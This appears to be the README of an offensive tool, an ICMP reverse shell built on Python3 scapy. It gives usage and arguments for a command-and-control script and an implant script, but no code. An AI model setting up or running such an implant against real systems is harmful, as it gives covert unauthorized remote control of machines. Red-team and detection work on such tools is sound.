# Python3 ICMP reverse shell 
ICMP reverse shell with python3 scapy

Usage:

icmp-cnc.py [-h] -i INTERFACE -d DESTINATION_IP (Command and Control)

./icmpdoor.py [-h] -i INTERFACE -d DESTINATION_IP (Implant)

optional arguments:

  -h, --help            show this help message and exit
  
  -i INTERFACE, --interface INTERFACE
  
                        Listener (virtual) Network Interface (e.g. eth0)
                        
  -d DESTINATION_IP, --destination_ip DESTINATION_IP
  
                        Destination IP address
